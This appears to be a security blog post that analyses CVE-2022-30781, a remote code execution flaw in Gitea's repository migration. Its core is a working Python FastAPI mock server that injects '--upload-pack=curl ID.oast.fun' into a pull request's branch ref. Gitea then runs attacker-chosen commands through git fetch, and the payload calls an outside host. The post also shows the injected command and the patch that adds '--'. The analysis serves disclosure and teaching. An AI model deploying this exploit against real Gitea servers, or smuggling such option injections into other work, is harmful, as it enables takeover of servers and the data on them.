---
title: Analysis of CVE-2022–30781
published: true
---


# Analysis of CVE-2022–30781  
## How Git Fetch Resulted in Critical Remote Code Execution in Gitea  

![Gitea Logo](#)  

**Good Morning, Everyone!**  
In today's post, I'll dive into an analysis of CVE-2022–30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.  

### Here's what we'll cover:
- Understanding How the CVE Works  
- Writing Our Own Exploit  
- How the Gitea Team Fixed It  

Let's jump in and enjoy!  

---

## Import Your Git Repo  

In every Git platform like Gitea, there's a feature that allows you to import all your repositories from another platform or git server into your platform with a single click—this feature is called **Migration**.  

Besides `.git` repositories, it also provides options to import:  
- Pull requests  
- Wiki pages  
- Issues  

To extract this data, Gitea communicates with the chosen platform's API. One of the migration options is importing a repository from another Gitea server. By choosing this option, you can notice in the logs a few requests from Gitea for specific endpoints.  

One of these endpoints returns the repository's pull request information, including the pull request branch. Gitea fetches this branch using the command:  
```bash
$ git fetch <remote> <branch>
``` 

Unfortunately, we cannot escape using whitespace here to achieve an RCE.  

---

## Fetch Options  

The `git fetch` subcommand has a few options, as documented in the [Git Fetch Documentation](https://git-scm.com/docs/git-fetch).  

### The interesting one:
- `--upload-pack <upload-pack>`  
  This option specifies a non-default path for the `git-upload-pack` tool when fetching from a repository.  

Using this option, we can potentially achieve **Remote Code Execution (RCE)**. Injecting `--upload-pack='CMD'` into a branch name or remote repository path allows us to change the default behavior. However, Git itself doesn't allow this directly. 😞  

But since Gitea uses APIs to fetch repository information, we can set up a mock server to return fake data. When the server asks for the pull request branch, we include the `--upload-pack` option in the response to test if it gets executed.  

---

## Writing the Exploit  

When writing exploits, I always choose Python for its simplicity and speed. Here's how I approached writing this exploit.  

The first step is understanding what the Gitea API client expects as a response. By analyzing the Gitea Swagger file, I created this simple mock API using FastAPI:  

```python
from fastapi import APIRouter

router = APIRouter(prefix="/api/v1")
RCE_PAYLOAD = "curl ID.oast.fun"

# Mock data for some endpoints
MAX_RESPONSE_ITEMS = 50
DEFAULT_PAGING_NUM = 30
DEFAULT_GIT_TREES_PER_PAGE = 1000
DEFAULT_MAX_BLOB_SIZE = 10485760
full_uri = "http://localhost:3000/"

@router.get("/version")
async def get_version():
    return {"version": "1.16.6"}

@router.get("/settings/api")
async def get_settings():
    return {
        "max_response_items": MAX_RESPONSE_ITEMS,
        "default_paging_num": DEFAULT_PAGING_NUM,
        "default_git_trees_per_page": DEFAULT_GIT_TREES_PER_PAGE,
        "default_max_blob_size": DEFAULT_MAX_BLOB_SIZE,
    }

@router.get("/repos/{owner}/{repo}")
async def get_repo_info(owner: str, repo: str):
    return {
        "clone_url": f"{full_uri}{owner}/{repo}",
        "owner": {"login": owner},
    }

@router.get("/repos/{owner}/{repo}/topics")
async def get_repo_topics(owner: str, repo: str):
    return {"topics": []}

@router.get("/repos/{owner}/{repo}/pulls")
async def get_repo_pulls(owner: str, repo: str):
    return [
        {
            "base": {"ref": "master"},
            "head": {
                "ref": f"--upload-pack={RCE_PAYLOAD}",
                "repo": {
                    "clone_url": "./",
                    "owner": {"login": "master"},
                },
            },
            "updated_at": "2001-01-01T05:00:00+01:00",
            "user": {},
        }
    ]
```

In the `/pulls` endpoint, I injected the `--upload-pack` option into the `ref`, corresponding to the pull request's base branch.  

### Testing the Exploit  

I ran the mock API, created a new migration in Gitea, and set the repository URL to `http://localhost:3000/test/test`. I enabled the option to fetch pull requests, ensuring it fetched the repository's pull requests during migration.  

### Result  

In the background, Gitea executed:  
```bash
$ git fetch origin --upload-pack='curl <host>'
```  

This caused Gitea to make the specified curl request, successfully demonstrating an **RCE** as a Proof of Concept (PoC).  

---

## Patching the Bug  

The Gitea team fixed this bug by using `--`, which forces Git to treat everything following it as a plain string rather than a parsable option. This effectively resolves the issue.  

---

**And that's it!**  
I hope you found this helpful.  

You can access the testing lab and the exploit at:  
[latestpocs/CVE-2022–30781](https://github.com/MindPatch/latestpocs)  

Take care, and see you next time! 🙂  